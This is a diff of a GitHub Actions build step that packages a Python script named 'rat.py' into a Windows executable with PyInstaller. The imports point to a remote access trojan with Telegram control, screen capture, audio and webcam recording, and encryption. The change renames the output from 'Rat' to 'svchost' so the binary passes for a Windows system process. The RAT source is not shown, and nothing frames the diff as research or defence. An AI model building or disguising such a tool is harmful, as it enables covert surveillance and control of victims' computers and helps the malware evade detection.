@@ -44,7 +44,7 @@ jobs:
       
       - name: Build EXE
         run: |
-          pyinstaller --onefile --name "Rat" --hidden-import telegram --hidden-import telegram.ext --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import psutil --hidden-import requests --hidden-import sounddevice --hidden-import soundfile --hidden-import cryptography --hidden-import cryptography.fernet --hidden-import tkinter --hidden-import pycaw --hidden-import comtypes --hidden-import cv2 --hidden-import numpy --collect-all telegram rat.py
+          pyinstaller --onefile --name "svchost" --hidden-import telegram --hidden-import telegram.ext --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import psutil --hidden-import requests --hidden-import sounddevice --hidden-import soundfile --hidden-import cryptography --hidden-import cryptography.fernet --hidden-import tkinter --hidden-import pycaw --hidden-import comtypes --hidden-import cv2 --hidden-import numpy --collect-all telegram rat.py
       
       - name: Upload EXE
         uses: actions/upload-artifact@v4
